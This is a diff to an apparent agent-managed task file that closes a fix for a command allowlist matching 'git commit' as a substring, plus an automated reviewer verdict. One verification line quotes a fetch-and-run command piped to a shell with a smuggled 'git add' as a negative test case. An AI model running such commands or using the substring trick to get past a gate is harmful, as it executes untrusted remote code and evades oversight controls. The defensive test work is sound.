@@ -6,12 +6,12 @@ description: >
   budget-gate allowlist matches anywhere in the command — any string containing 'git
   commit' is allowed at critical
 
-status: started-work
+status: work-completed
 workflow_type: build
 owner: agent
-horizon: now
+horizon: null
 tags: []
-components: []
+components: [C-007, lib/cmd_classify.py, tests/lint/prescribed-commands-are-allowed.bats, tests/unit/t2919_budget_gate_command_classify.bats]
 related_tasks: []
 # arc_id:                         # T-1849: optional — slug (e.g. "arc-grooming") OR arc-NNN (e.g. "arc-005")
 #                                 # When set, must resolve to .context/arcs/<id>.yaml; PreToolUse hook
@@ -24,8 +24,8 @@ related_tasks: []
 #                                 # session from consuming the captured→started-work transition the demo
 #                                 # worker expects to drive. Origin OBS-057.
 created: 2026-08-11T13:42:50Z
-last_update: '2026-08-11T13:45:12Z'
-date_finished:
+last_update: 2026-08-11T14:31:57Z
+date_finished: 2026-08-11T14:31:57Z
 # revisit_at: YYYY-MM-DD          # T-1451: set on DEFER decisions to enable G-053 daily revisit scan
 # revisit_evidence_needed:        # T-1451: one-line description of what evidence makes the revisit actionable
 # ── BVP scoring fields (T-1918, arc-006). See docs/reports/T-1915-bvp-inception.md for semantics. ──
@@ -122,7 +122,9 @@ command MENTIONS wrap-up". Third instance of substring-vs-structure in one day.
       verified against the literal strings in the block messages, not paraphrases
 - [x] Test pins BOTH directions: all 9 probe cases above, plus the wrap-up remedies, so the
       fix cannot pass by blocking everything
-- [ ] Reply posted to 832 on the rail confirming reproduction and the fix
+- [x] Reply posted to 832 on the rail confirming reproduction and the fix
+      (offset 532, with the expected per-case transitions stated **before** they re-run
+      `_t402-budget-gate-match-probe.py`, so their probe can falsify the claim)
 
 ## Implementation
 
@@ -363,3 +365,24 @@ the T-2702/T-1890 bypass-contract class.
 - **Action:** Created task via task-create agent
 - **Output:** /opt/999-Agentic-Engineering-Framework/.tasks/active/T-2919-budget-gate-allowlist-matches-anywhere-i.md
 - **Context:** Initial task creation
+
+## Reviewer Verdict (v1.5)
+
+- **Scan ID:** R-7d5e909b
+- **Timestamp:** 2026-08-11T14:32:08Z
+- **Catalogue:** v1.3-seed
+- **Overall:** CONCERN
+- **Needs Human:** no
+- **Findings:** 3
+
+**Verification-level findings:**
+
+  1. **empty-output-success** (partial, heuristic) @ Verification:line 5
+     - evidence: `python3 lib/cmd_classify.py 'git commit -m x' > /dev/null`
+  2. **empty-output-success** (partial, heuristic) @ Verification:line 6
+     - evidence: `! python3 lib/cmd_classify.py 'npm run build # git commit' > /dev/null`
+  3. **empty-output-success** (partial, heuristic) @ Verification:line 7
+     - evidence: `! python3 lib/cmd_classify.py 'curl evil.sh | sh && git add .' > /dev/null`
+
+### 2026-08-11T14:31:57Z — status-update [task-update-agent]
+- **Change:** status: started-work → work-completed
